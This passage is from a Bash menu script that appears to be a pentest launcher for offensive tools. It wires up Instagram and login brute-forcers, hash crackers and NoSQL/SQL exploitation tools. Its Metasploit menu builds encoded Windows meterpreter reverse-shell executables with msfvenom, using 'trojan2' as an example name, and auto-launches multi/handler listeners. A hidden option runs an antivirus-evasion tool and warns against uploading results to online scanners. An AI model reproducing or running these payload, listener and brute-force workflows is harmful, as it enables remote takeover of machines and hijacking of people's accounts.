\"\"$YS\" 2\"$CE\") Leviathan             Wide range mass audit toolkit\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 2\"$CE\") \"$RS\"Leviathan\"$CE\"             Wide range mass audit toolkit\"\n\t\tfi\n\t\tif [[ -d /root/NoSQLMap ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 3\"$CE\") NoSQLMap              Automated NoSQL exploitation tool\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 3\"$CE\") \"$RS\"NoSQLMap\"$CE\"              Automated NoSQL exploitation tool\"\n\t\tfi\n\t\tif [[ -d /root/Yuki-Chan-The-Auto-Pentest ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 4\"$CE\") Yuki Chan             Automated Pentest Tool\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 4\"$CE\") \"$RS\"Yuki Chan\"$CE\"             Automated Pentest Tool\"\n\t\tfi\n\t\tif [[ -d /root/Blazy ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 5\"$CE\") Blazy                 Login bruteforcer/tests for CSRF, Cj, Cloudflare, WAF\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 5\"$CE\") \"$RS\"Blazy\"$CE\"                 Login bruteforcer/tests for CSRF, Clickjacking, Cloudflare and WAF\"\n\t\tfi\n\t\tif [[ -d /root/Striker ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 6\"$CE\") Striker               An offensive information and vulnerability scanner\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 6\"$CE\") \"$RS\"Striker\"$CE\"               An offensive information and vulnerability scanner\"\n\t\tfi\n\t\tif [[ -d /root/hyprPulse ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 7\"$CE\") HyprPulse             Brute force multiple accounts at once\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 7\"$CE\") \"$RS\"HyprPulse\"$CE\"             Brute force multiple accounts at once\"\n\t\tfi\n\t\tif [[ -d /root/hyprPulse ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 8\"$CE\") InstaBurst            A faster way to brute force Instagram\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 8\"$CE\") \"$RS\"InstaBurst\"$CE\"             A faster way to brute force Instagram\"\n\t\tfi\n\t\tif [[ -f /usr/local/bin/instagram-py ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 9\"$CE\") Instagram-py          Brute force Instagram without password limiting\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 9\"$CE\") \"$RS\"Instagram-py\"$CE\"          Brute force Instagram without password limiting\"\n\t\tfi\n\t\tif [[ -d /root/datasploit ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\"10\"$CE\") Datasploit            Recon on Companies, People, Phone, Bitcoin...\"\n\t\telse\n\t\t\techo -e \"\"$RS\"10\"$CE\") \"$RS\"Datasploit\"$CE\"            Recon on Companies, People, Phone, Bitcoin...\"\n\t\tfi\n\t\tif [[ -d /root/SiteBroker ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\"11\"$CE\") SiteBroker            Utility to penetrate and test websites\"\n\t\telse\n\t\t\techo -e \"\"$RS\"11\"$CE\") \"$RS\"SiteBroker\"$CE\"            Utility to penetrate and test websites\"\n\t\tfi\n\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\techo -e \"\"$YS\"00\"$CE\") Main menu\"\n\t\techo -e \"Choose: \"\n\t\tread WEB\n\t\tclear\n\t\tif [[ \"$WEB\" = 1 ]]\n\t\tthen\n\t\t\tif [[ -f /usr/bin/sqlmap ]]\n\t\t\tthen\n\t\t\t\tsqlmap_menu\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_sqlmap\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\t\telif [[ \"$WEB\" = 2 ]]\n\t\tthen\n\t\t\tif [[ -d /root/leviathan ]]\n\t\t\tthen\n\t\t\t\tcd /root/leviathan\n\t\t\t\tpython leviathan.py\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_leviathan\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\t\telif [[ \"$WEB\" = 3 ]]\n\t\tthen\n\t\t\tif [[ -d /root/NoSQLMap ]]\n\t\t\tthen\n\t\t\t\tcd /root/NoSQLMap\n\t\t\t\tpython nosqlmap.py\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_nosqlmap\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\t\telif [[ \"$WEB\" = 4 ]]\n\t\tthen\n\t\t\tif [[ -d /root/Yuki-Chan-The-Auto-Pentest ]]\n\t\t\tthen\n\t\t\t\tcd /root/Yuki-Chan-The-Auto-Pentest\n\t\t\t\t./yuki.sh\n\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t$READAK\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_yuki\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\t\telif [[ \"$WEB\" = 5 ]]\n\t\tthen\n\t\t\tif [[ -d /root/Blazy ]]\n\t\t\tthen\n\t\t\t\tcd /root/Blazy\n\t\t\t\tpython blazy.py\n\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t$READAK\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_blazy\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\t\telif [[ \"$WEB\" = 6 ]]\n\t\tthen\n\t\t\tif [[ -d /root/Striker ]]\n\t\t\tthen\n\t\t\t\tcd /root/Striker\n\t\t\t\tpython striker.py\n\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t$READAK\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_striker\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\t\telif [[ \"$WEB\" = 7 ]]\n\t\tthen\n\t\t\tif [[ -d /root/hyprPulse ]]\n\t\t\tthen\n\t\t\t\tcd /root/hyprPulse\n\t\t\t\tpython pulsar.py\n\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t$READAK\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_hyprpulse\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\t\telif [[ \"$WEB\" = 8 ]]\n\t\tthen\n\t\t\tif [[ -d /root/InstaBurst ]]\n\t\t\tthen\n\t\t\t\tcd /root/InstaBurst\n\t\t\t\tpython instagram.py\n\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t$READAK\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_instaburst\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\t\telif [[ \"$WEB\" = 9 ]]\n\t\tthen\n\t\t\tif [[ -f /usr/local/bin/instagram-py ]]\n\t\t\tthen\n\t\t\t\twhile true\n\t\t\t\tdo\n\t\t\t\t\tclear\n\t\t\t\t\tTERMINALTITLE=\"Instagram-py\"\n\t\t\t\t\tdash_calc\n\t\t\t\t\tprintf '\\033]2;Instagram-py\\a'\n\t\t\t\t\techo -e \" \"$YS\"1\"$CE\") New attack\"\n\t\t\t\t\techo -e \" \"$YS\"2\"$CE\") Continue previous attack\"\n\t\t\t\t\techo -e \" \"$YS\"3\"$CE\") View cracked passwords\"\n\t\t\t\t\techo -e \" \"$YS\"4\"$CE\") Create configuration\"\n\t\t\t\t\techo -e \" \"$YS\"b\"$CE\") Go back\"\n\t\t\t\t\tread C\n\t\t\t\t\tclear\n\t\t\t\t\tif [[ \"$C\" == 1 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$YS\"Username: \"$CE\"\"\n\t\t\t\t\t\tread USRNM\n\t\t\t\t\t\techo -e \"\"$YS\"Wordlist path: \"$CE\"\"\n\t\t\t\t\t\tread WRDLST\n\t\t\t\t\t\tif [[ ! -f \"$WRDLST\" ]]\n\t\t\t\t\t\tthen\n\t\t\t\t\t\t\techo -e \"\"$RS\"File not found\"$CE\"\"\n\t\t\t\t\t\t\tsleep 2\n\t\t\t\t\t\t\tcontinue\n\t\t\t\t\t\tfi\n\t\t\t\t\t\tinstagram-py -vvv -u \"$USRNM\" -pl \"$WRDLST\"\n\t\t\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t\t\t$READAK\n\t\t\t\t\telif [[ \"$C\" == 2 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$YS\"Username: \"$CE\"\"\n\t\t\t\t\t\tread USRNM\n\t\t\t\t\t\techo -e \"\"$YS\"Wordlist path: \"$CE\"\"\n\t\t\t\t\t\tread WRDLST\n\t\t\t\t\t\tif [[ ! -f \"$WRDLST\" ]]\n\t\t\t\t\t\tthen\n\t\t\t\t\t\t\techo -e \"\"$RS\"File not found\"$CE\"\"\n\t\t\t\t\t\t\tsleep 2\n\t\t\t\t\t\t\tcontinue\n\t\t\t\t\t\tfi\n\t\t\t\t\t\tinstagram-py -vvv -c -u \"$USRNM\" -pl \"$WRDLST\"\n\t\t\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t\t\t$READAK\n\t\t\t\t\telif [[ \"$C\" == 3 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$YS\"Username: \"$CE\"\"\n\t\t\t\t\t\tread USRNM\n\t\t\t\t\t\tinstagram-py -i \"$USRNM\"\n\t\t\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t\t\t$READAK\n\t\t\t\t\telif [[ \"$C\" == 4 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tinstagram-py -cc\n\t\t\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t\t\t$READAK\n\t\t\t\t\telif [[ \"$C\" == \"b\" || \"$C\" == \"back\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tclear\n\t\t\t\t\t\tbreak\n\t\t\t\t\telif [[ \"$C\" == 0 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tclear\n\t\t\t\t\t\texit\n\t\t\t\t\telif [[ \"$C\" == 00 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\texec bash $0\n\t\t\t\t\tfi\n\t\t\t\tdone\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_instagram-py\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\t\telif [[ \"$WEB\" = 10 ]]\n\t\tthen\n\t\t\tif [[ -d /root/datasploit ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$YS\"Domain: \"$CE\"\"\n\t\t\t\tread DMN\n\t\t\t\tcd /root/datasploit\n\t\t\t\tpython datasploit.py -i \"$DMN\"\n\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t$READAK\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_datasploit\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\t\telif [[ \"$WEB\" = 11 ]]\n\t\tthen\n\t\t\tif [[ -d /root/SiteBroker ]]\n\t\t\tthen\n\t\t\t\tcd /root/SiteBroker\n\t\t\t\tpython SiteBroker.py\n\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t$READAK\n\t\t\telse\n\t\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_sitebroker\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\n\t\telif [[ \"$WEB\" = \"\" ]]\n\t\tthen\n\t\t\tcontinue\n\t\telif [[ \"$WEB\" = 0 ]]\n\t\tthen\n\t\t\texit\n\t\telif [[ \"$WEB\" = 00 ]]\n\t\tthen\n\t\t\texec bash $0\n\t\telif [[ \"$WEB\" = \"back\" || \"$WEB\" = \"b\" ]]\n\t\tthen\n\t\t\tbreak\n\t\tfi\n\t\t#~ echo -e \"$PAKTGB\"\n\t\t#~ $READAK\n\tdone\n}\nfunction other_tools\n{\nwhile true\ndo\n\tprintf '\\033]2;OTHER TOOLS\\a'\n\tclear\n\tTERMINALTITLE=\"OTHER TOOLS\"\n\tdash_calc\n\tif [[ -f /usr/bin/geany ]]\n\tthen\n\t\techo -e \"\"$YS\" 1\"$CE\") Geany            Best notepad for linux\"\n\telse\n\t\techo -e \"\"$RS\" 1\"$CE\") \"$RS\"Geany\"$CE\"            Best notepad for linux\"\n\tfi\n\tif [[ -d /root/dagon ]]\n\tthen\n\t\techo -e \"\"$YS\" 2\"$CE\") Dagon            Hash cracker/Advanced Hash Manipulation\"\n\telse\n\t\techo -e \"\"$RS\" 2\"$CE\") \"$RS\"Dagon\"$CE\"            Hash cracker/Advanced Hash Manipulation\"\n\tfi\n\tif [[ -d /root/LALIN ]]\n\tthen\n\t\techo -e \"\"$YS\" 3\"$CE\") LALIN            Automatically install any package for pentest \"\n\telse\n\t\techo -e \"\"$RS\" 3\"$CE\") \"$RS\"LALIN\"$CE\"            Automatically install any package for pentest \"\n\tfi\n\tif [[ -d /root/cupp ]]\n\tthen\n\t\techo -e \"\"$YS\" 4\"$CE\") Cupp             Make specific worldlists\"\n\telse\n\t\techo -e \"\"$RS\" 4\"$CE\") \"$RS\"Cupp\"$CE\"             Make specific worldlists\"\n\tfi\n\tif [[ -d /root/cupp ]]\n\tthen\n\t\techo -e \"\"$YS\" 5\"$CE\") Bleachbit        Free up space\"\n\telse\n\t\techo -e \"\"$RS\" 5\"$CE\") \"$RS\"Bleachbit\"$CE\"        Free up space\"\n\tfi\n\tif [[ -d /root/Hash-Buster ]]\n\tthen\n\t\techo -e \"\"$YS\" 6\"$CE\") Hash Buster      Hash cracker\"\n\telse\n\t\techo -e \"\"$RS\" 6\"$CE\") \"$RS\"Hash Buster\"$CE\"      Hash cracker\"\n\tfi\n\tif [[ -d /root/patator ]]\n\tthen\n\t\techo -e \"\"$YS\" 7\"$CE\") Patator          Bruteforcer\"\n\telse\n\t\techo -e \"\"$RS\" 7\"$CE\") \"$RS\"Patator\"$CE\"          Bruteforcer\"\n\tfi\n\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\techo -e \"\"$YS\" 0\"$CE\") EXIT\"\n\techo -e \"Choose: \"\n\tread -e OTHERT\n\tclear\n\tif [[ \"$OTHERT\" = 1 ]]\n\tthen\n\t\tif [[ -f /usr/bin/geany ]]\n\t\tthen\n\t\t\tgeany\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_geany\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\n\t\tfi\n\telif [[ \"$OTHERT\" = 2 ]]\n\tthen\n\t\tif [[ -d /root/dagon ]]\n\t\tthen\n\t\t\tdagon_script\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\t\tread INSTALL\n\t\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\t\tthen\n\t\t\t\t\tinstall_dagon\n\t\t\t\telse\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\n\t\tfi\n\telif [[ \"$OTHERT\" = 3 ]]\n\tthen\n\t\tif [[ -d /root/LALIN ]]\n\t\tthen\n\t\t\tcd /root/LALIN\n\t\t\t./Lalin.sh\n\t\t\tcd\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_lalin\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$OTHERT\" = \"4\" ]]\n\tthen\n\t\tif [[ -d \"/root/cupp\" ]]\n\t\tthen\n\t\t\tcd /root/cupp\n\t\t\tpython cupp.py -i\n\t\t\tcd\t\t\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\t\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_cupp\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$OTHERT\" = \"5\" ]]\n\tthen\n\t\tif [[ -f \"/usr/bin/bleachbit\" ]]\n\t\tthen\n\t\t\tbleachbit\t\t\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_bleachbit\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$OTHERT\" = \"6\" ]]\n\tthen\n\t\tif [[ -d \"/root/Hash-Buster\" ]]\n\t\tthen\n\t\t\tcd /root/Hash-Buster\n\t\t\tpython hash.py\t\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\t\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_hashbuster\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$OTHERT\" = \"7\" ]]\n\tthen\n\t\tif [[ -d \"/root/patator\" ]]\n\t\tthen\n\t\t\tpatator_automation\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\t\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_patator\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$OTHERT\" = 00 ]]\n\tthen\n\t\tclear\n\t\texec bash $0\n\telif [[ \"$OTHERT\" = \"back\" || \"$OTHERT\" = \"b\" ]]\n\tthen\n\t\tbreak\n\telif [[ \"$OTHERT\" = 0 ]]\n\tthen\n\t\tclear\n\t\texit\n\tfi\ndone\n}\nfunction findsploit_menu\n{\n\tclear\n\techo -e \"Search: \"\n\tread FSEARCH\n\tfindsploit \"$FSEARCH\"\n\techo -e \"$PAKTGB\"\n\t$READAK\n}\nfunction metasploit_menu\n{\n\tif [[ ! -d \"$LPATH\"/rc ]]\n\tthen\n\t\tmkdir \"$LPATH\"/rc\n\tfi\n\twhile true\n\tdo\n\tclear\n\tTERMINALTITLE=\"METASPLOIT\"\n\tdash_calc\n\tprintf '\\033]2;METASPLOIT\\a'\n\techo -e \"\"$YS\" 1\"$CE\") Create payload with msfvenom\"\n\techo -e \"\"$YS\" 2\"$CE\") Create listener\"\n\techo -e \"\"$YS\" 3\"$CE\") Saved listeners\"\n\techo -e \"\"$YS\" 4\"$CE\") Start msfconsole\"\n\techo -e \"\"$YS\" 5\"$CE\") Update msfconsole\"\n\techo -e \"\"$YS\" 6\"$CE\") Armitage\"\n\techo -e \"\"$YS\" 7\"$CE\") Findsploit\"\n\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\techo -e \"\"$YS\" 0\"$CE\") EXIT\"\n\techo -e \"Choose: \"\n\tread -e METASP\n\tclear\n\tif [[ \"$METASP\" = \"1\" ]]\n\tthen\n\t\tPAYLOADL=\"\"\n\t\techo -e \"PAYLOAD (Default: \"$YS\"windows/meterpreter/reverse_tcp\"$CE\"): \"\n\t\tread PAYLOADL\n\t\tif [[ -z \"$PAYLOADL\" ]]\n\t\tthen\n\t\t\techo -e \"Setting PAYLOAD to windows/meterpreter/reverse_tcp\"\n\t\t\tsleep 2\n\t\t\tPAYLOADL=\"windows/meterpreter/reverse_tcp\"\n\t\tfi\n\t\techo -e \"LHOST: \"\n\t\tread ATIP\n\t\techo -e \"\"\n\t\techo -e \"LPORT: \"\n\t\tread ATPORT\n\t\techo -e \"\"\n\t\techo -e \"Enter the target's architecture(\"$YS\"x86\"$CE\"/\"$YS\"x64\"$CE\"): \"\n\t\tread TARCH\n\t\techo -e \"Enter the name of the payload(e.g: \"$YS\"trojan2\"$CE\"): \"\n\t\tread ATEXE\n\t\tATEXEPATH=\"/root/Desktop/$ATEXE.exe\"\n\t\tclear\n\t\techo -e \"Generating\"\n\t\tsleep 0.1\n\t\techo .\n\t\tsleep 0.1\n\t\techo .\n\t\tsleep 0.1\n\t\techo .\n\t\tsleep 0.1\n\t\techo .\n\t\tsleep 0.1\n\t\techo .\n\t\tsleep 0.1\n\t\techo .\n\t\tif [[ \"$TARCH\" = \"x64\" ]]\n\t\tthen\n\t\t\tmsfvenom -p $PAYLOADL --platform windows -a x64 -f exe -e x86/shikata_ga_nai LHOST=\"$ATIP\" LPORT=\"$ATPORT\" -o \"$ATEXEPATH\"\n\t\telse\n\t\t\tmsfvenom -p $PAYLOADL --platform windows -a x86 -f exe -e x86/shikata_ga_nai LHOST=\"$ATIP\" LPORT=\"$ATPORT\" -o \"$ATEXEPATH\"\n\t\tfi\n\t\techo -e \"Done.\"\n\t\techo -e \"\"\n\t\techo -e \"$PAKTC\"\n\t\t$READAK\n\t\tclear\n\t\techo -e \"Create a listener for this payload? $YNYES \"\n\t\tread PAYL\n\t\tif [[ \"$PAYL\" != \"n\" ]]\n\t\tthen\n\t\t\techo -e \"Name of listener(e.g: \"$YS\"john\"$CE\") : \"\n\t\t\tread NAMEL\n\t\t\techo \"use exploit/multi/handler\" > \"$LPATH\"/rc/\"$NAMEL\".rc\n\t\t\techo \"set PAYLOAD $PAYLOADL \" >> \"$LPATH\"/rc/\"$NAMEL\".rc\n\t\t\techo \"set LHOST $ATIP \" >> \"$LPATH\"/rc/\"$NAMEL\".rc\n\t\t\techo \"set LPORT $ATPORT \" >> \"$LPATH\"/rc/\"$NAMEL\".rc\n\t\t\techo \"set ExitOnSession false\" >> \"$LPATH\"/rc/\"$NAMEL\".rc\n\t\t\techo \"exploit -j\" >> \"$LPATH\"/rc/\"$NAMEL\".rc\n\t\t\tclear\n\t\t\techo -e \"Launch the listener now? \"$YNONLY\"\"\n\t\t\tread LLN\n\t\t\tif [[ \"$LLN\" = \"y\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"Launching msfconsole...\"\n\t\t\t\tsleep 2\n\t\t\t\tclear\n\t\t\t\tmsfconsole -r \"$LPATH\"/rc/\"$NAMEL\".rc\n\t\t\tfi\n\t\tfi\n\telif [[ \"$METASP\" = \"z\" ]]\n\tthen\n\t\tclear\n\t\techo -e \"CAUTION: DO NOT upload it to anti-virus scanners online.\"\n\t\tsleep 3\n\t\techo -e \"You agree with that?(\"$YS\"YES\"$CE\"/\"$YS\"*\"$CE\")\"\n\t\tread MUSTBEYES\n\t\tif [[ \"$MUSTBEYES\" = \"YES\" ]] \n\t\tthen \n\t\t\tclear\n\t\t\tcd /root/zirikatu\n\t\t\t./zirikatu.sh\n\t\tfi\n\telif [[ \"$METASP\" = \"2\" ]]\n\tthen\n\t\tclear\n\t\techo -e \"LHOST: \"\n\t\tread LHOSTL\n\t\techo -e \"LPORT: \"\n\t\tread LPORTL\n\t\techo -e \"PAYLOAD (Default: \"$YS\"windows/meterpreter/reverse_tcp\"$CE\"): \"\n\t\tread PAYLOADL\n\t\tif [[ -z \"$PAYLOADL\" ]]\n\t\tthen\n\t\t\techo -e \"Setting PAYLOAD to windows/meterpreter/reverse_tcp\"\n\t\t\tsleep 2\n\t\t\tPAYLOADL=\"windows/meterpreter/reverse_tcp\"\n\t\tfi\n\t\techo -e \"Name of listener(e.g: \"$YS\"john\"$CE\") : \"\n\t\tread NAMEL\n\t\techo \"use exploit/multi/handler\" > \"$LPATH\"/rc/\"$NAMEL\".rc\n\t\techo \"set PAYLOAD $PAYLOADL \" >> \"$LPATH\"/rc/\"$NAMEL\".rc\n\t\techo \"set LHOST $LHOSTL \" >> \"$LPATH\"/rc/\"$NAMEL\".rc\n\t\techo \"set LPORT $LPORTL \" >> \"$LPATH\"/rc/\"$NAMEL\".rc\n\t\techo \"set ExitOnSession false\" >> \"$LPATH\"/rc/\"$NAMEL\".rc\n\t\techo \"exploit -j\" >> \"$LPATH\"/rc/\"$NAMEL\".rc\n\t\tclear\n\t\techo -e \"Launch the listener now? \"$YNONLY\"\"\n\t\tread LLN\n\t\tif [[ \"$LLN\" = \"y\" ]]\n\t\tthen\n\t\t\techo -e \"Launching msfconsole...\"\n\t\t\tsleep 2\n\t\t\tclear\n\t\t\tmsfconsole -r \"$LPATH\"/rc/\"$NAMEL\".rc\n\t\tfi\n\telif [[ \"$METASP\" = \"3\" ]]\n\tthen\n\t\twhile true\n\t\tdo\n\t\tclear\n\t\tls -w 1 \"$LPATH\"/rc\n\t\techo -e \"\"\n\t\techo -e \"\"\n\t\techo -e \"Enter the name of the listener you want to select(e.g: \"$YS\"john\"$CE\")\"\n\t\techo -e \"\"$YS\" r\"$CE\") Delete all saved listeners\"\n\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\tread NAMERC\n\t\tclear\n\t\tif [[ \"$NAMERC\" = \"back\" || \"$NAMERC\" = \"b\" ]]\n\t\tthen\n\t\t\tbreak\n\t\telif [[ \"$NAMERC\" = \"reset\" || \"$NAMERC\" = \"r\" ]]\n\t\tthen\n\t\t\trm -f \"$LPATH\"/rc/*\n\t\t\tcontinue\n\t\tfi\n\t\tif [[ ! -f \"$LPATH\"/rc/\"$NAMERC\" ]]\n\t\tthen\n\t\t\tNAMERC=\"$NAMERC\".rc\n\t\t\tif [[ ! -f \"$LPATH\"/rc/\"$NAMERC\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"File not found. Try again..\"\n\t\t\t\tsleep 2\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\t\twhile true\n\t\tdo\n\t\tclear\n\t\techo -e \"\"$NAMERC\" selected.\"\n\t\techo -e \"\"$YS\" 1\"$CE\") Start listener\"\n\t\techo -e \"\"$YS\" 2\"$CE\") Delete listener\"\n\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\techo -e \"Choose: \"\n\t\tread LISTL\n\t\tif [[ \"$LISTL\" = \"1\" ]]\n\t\tthen\n\t\t\tmsfconsole -r \"$LPATH\"/rc/\"$NAMERC\"\n\t\telif [[ \"$LISTL\" = \"2\" ]]\n\t\tthen\n\t\t\trm \"$LPATH\"/rc/\"$NAMERC\"\n\t\t\tbreak\n\t\telif [[ \"$LISTL\" = \"back\" || \"$LISTL\" = \"b\" ]]\n\t\tthen\n\t\t\tbreak\n\t\tfi\n\t\tdone\n\t\tdone\n\telif [[ \"$METASP\" = \"4\" ]]\n\tthen\n\t\tmsfconsole\n\telif [[ \"$METASP\" = \"5\" ]]\n\tthen\n\t\tmsfupdate\n\telif [[ \"$METASP\" = \"6\" ]]\n\tthen\n\t\tservice postgresql start\n\t\tarmitage\n\t\tclear\n\telif [[ \"$METASP\" = \"7\" ]]\n\tthen\n\t\tfindsploit_menu\n\telif [[ \"$METASP\" = \"back\" || \"$METASP\" = \"b\" ]]\n\tthen\n\t\tBACKL=\"1\"\n\t\tbreak\n\telif [[ \"$METASP\" = \"00\" ]]\n\tthen\n\t\texec bash \"$0\"\n\telif [[ \"$METASP\" = \"0\" ]]\n\tthen\n\t\tclear\n\t\texit\n\tfi\n\tdone\n}\nfunction update_lscript\n{\n\techo -e \"Checking for updates...\"\n\tTESTINTERNETCONNECTION=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')\n\tif [[ \"$TESTINTERNETCONNECTION\" != \"\" ]]\n\tthen\n\t\tVER=$(timeout -s SIGTERM 20 curl \"https://raw.githubusercontent.com/arismelachroinos/lscript/master/version.txt\" 2>/dev/null)\n\t\tif [[ \"$VERSION\" != \"$VER\" ]]\n\t\tthen\n\t\t\tclear\n\t\t\techo -e \"There is an update available.\"\n\t\t\techo -e \"Current version: $VERSION\"\n\t\t\techo -e \"Updated version: $VER\"\n\t\t\techo -e \"$PAKTC\"\n\t\t\t$READAK\n\t\t\tclear\n\t\t\techo -e \"Do you want to 